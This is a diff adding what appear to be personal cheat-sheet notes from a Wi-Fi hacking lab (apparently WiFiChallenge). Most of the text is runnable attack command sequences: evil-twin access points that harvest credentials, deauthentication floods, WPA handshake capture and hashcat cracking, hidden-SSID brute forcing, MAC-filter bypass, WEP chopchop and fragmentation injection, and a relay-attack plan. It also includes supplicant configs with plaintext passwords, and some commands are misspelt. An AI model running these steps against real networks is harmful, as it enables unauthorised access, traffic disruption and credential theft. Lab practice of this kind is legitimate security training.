@@ -1,0 +1,206 @@
+----------------------------------[my struggles]-------------------------------------
+
+
+- finding the HTTP requests in monitor mode after connecting
+- cracking the evil-twin handshakes
+- struggling supplicant connect to enterprise because of PEAP (inner auth method) always check it
+- struggle to get the admin page login becuase of the domain name be fore the username
+- air hammer brute forcing need managed interfacec
+- berate_ap not working
+
+--------------------------------------------------------------------
+berate not working
+# 1) Kill anything that might still be holding the lock
+sudo pkill -f create_ap || true
+sudo pkill hostapd || true
+sudo pkill dnsmasq || true
+
+# 2) Remove stale lock files
+sudo rm -f /tmp/create_ap.all.lock /tmp/create_ap.*.lock
+
+# 3) (Often helps) stop services that fight for the Wi-Fi card
+sudo systemctl stop NetworkManager wpa_supplicant 2>/dev/null || true
+
+sudo berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 eth0 wifi-regional-tablets
+
+------------------------------------------------------------------------
+
+start evil-twin and monitor for my evil-twin
+sudo hostapd-mana  wpa3.conf
+sudo airodump-ng wlan2mon --bssid 02:00:00:00:01:00 -c 11  -w capture
+
+iwconfig wlan0mon channel 11
+aireplay-ng wlan0mon -0 0 -a F0:9F:C2:1A:CA:25  -c 10:F9:6F:AC:53:52
+
+
+hcxpcapngtool -o handshake.22000 capture.cap
+hashcat -m 22000 handshake.22000 rockyou.txt
+
+hidden networks
+
+- brute force the name
+cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ~/wifi-rockyou.txt
+airmon-ng start wlan0 
+iwconfig wlan0mon channel 11
+mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt
+
+- deauth a client for a handshake ( if there are clients)
+
+airodump-ng --bssid ap-bssid --channel 6 mon0
+aireplay-ng --deauth 4/2 -a ap-bssid -c client-bssid mon0 (on another tab)
+
+
+
+
+supplicant connections files
+
+
+FREE
+
+network={
+	ssid="wifi-guest"
+	key_mgmt=NONE
+	scan_ssid=1
+}
+
+WEB
+
+network={
+  ssid="wifi-old"
+  key_mgmt=NONE
+  wep_key0="11:BB:33:CD:55"
+  wep_tx_keyidx=0
+}
+
+WPA3
+
+network={
+    ssid="wifi-management"
+    psk="chocolate1"
+    key_mgmt=SAE WPA-PSK
+    proto=RSN
+    ieee80211w=1
+    scan_ssid=1
+}
+
+WPA Enterprise
+
+network={
+    ssid="wifi-corp"
+    scan_ssid=1
+    key_mgmt=WPA-EAP
+
+    eap=PEAP
+    identity="CONTOSO\juan.tr"                 
+    anonymous_identity="anonymous@WiFiChallenge.com"
+    password="bulldogs1234"               
+    phase2="auth=MSCHAPV2"
+
+    ca_cert="/home/user/corp/ca"              
+}
+-------------------------------------------------------------------------------------
+
+bypass mac filtering
+
+systemctl stop network-manager
+ip link set wlan2 down
+macchanger -m b0:72:bf:44:b0:49 wlan2
+ip link set wlan2 up
+
+wpa_supplicant -Dnl80211 -iwlan2 -c open.conf
+sudo dhclient -v wlan2
+-------------------------------------------------------------------------------------
+
+WEB SKA
+
+airodump-ng --bssid ap-bssid --channel 6 mon0
+
+aireplay-ng --fakeauth 0 -a target-mac -h your-mac wlan0mon (once fake auth we will get SKA in the AUTH so we can not do the 3 injection methods)
+(there are three methods)
+- deauth a client to capture SKA and auth with it (hardest, fakeauth + client)
+- airodump-ng --bssid ap-mac -c ap-chan mon0 --write ska-crack
+aireplay-ng --arpreplay -b ap-mac -h client-mac mon0 (no fakeauth, yes client)
+aircrack-ng ska-crack-01.cap
+-------------------------------------------------------------------------------------
+
+WEB busy network / WEB arpreplay attack / WEB chopchop attack / WEB fragmentation attack
+
+
+WEB busy network 
+
+capture
+sudo airodump-ng -c 1 --bssid F0:9F:C2:AA:19:29 -w wifi-old wlan0mon
+
+crack
+sudo aircrack-ng wifi-old-01.cap
+
+increasing the data rapidly
+
+WEB arpreplay attack
+
+fake auth
+aireplay-ng --fakeauth 0 -a target-mac -h your-mac wlan0mon
+
+capture
+sudo airodump-ng -c 1 --bssid F0:9F:C2:AA:19:29 -w wifi-old wlan0mon
+
+
+injection
+aireplay-ng --arpreplay -b target-mac -h your-mac wlan0mon
+
+
+WEB chopchop attack
+
+fake auth
+aireplay-ng --fakeauth 0 -a target-mac -h your-mac wlan0mon
+
+capture
+sudo airodump-ng -c 1 --bssid F0:9F:C2:AA:19:29 -w wifi-old wlan0mon
+
+
+capture and determine key stream
+aireplay-ng --chopchop -b target-mac -h your-mac wlan2mon
+
+forge a new packet
+packetforge-ng -0 -a target-mac -h your-mac -k 255.255.255.255 -l 255.255.255.255  -y 1122out.xor -w chop.out
+
+inject the forged packet into the traffic generate new IV's
+
+airplay-ng -2 -r chop-out wlan2mon
+
+WEB fragmentation attack
+
+
+fake auth
+aireplay-ng --fakeauth 0 -a target-mac -h your-mac wlan0mon
+
+capture
+sudo airodump-ng -c 1 --bssid F0:9F:C2:AA:19:29 -w wifi-old wlan0mon
+
+
+capture and determine key stream
+aireplay-ng --fragment -b target-mac -h your-mac wlan2mon
+
+forge a new packet
+packetforge-ng -0 -a target-mac -h your-mac -k 255.255.255.255 -l 255.255.255.255  -y 1122out.xor -w chop.out
+
+inject the forged packet into the traffic generate new IV's
+
+airplay-ng -2 -r chop-out wlan2mon
+
+-------------------------------------------------------------------------------------------
+
+
+WPA WPS/ WPA wordlist attack/ WPA evil-twin attack
+
+
+
+-------------------------------------
+checking which enterprise client does not use MFT to do relay attack if the password is hard to avoid 
+dictionary attack
+
+- open wireshark to monitor the monitor mode interface
+- put wireshark on the filter wlan.fc.type_subtype == 0x0b
+- get the enterprise clients mac 
+- deauthenticate one and see wireshark if no packets on that filter means the client has no MFT
+- use the relay attack on him
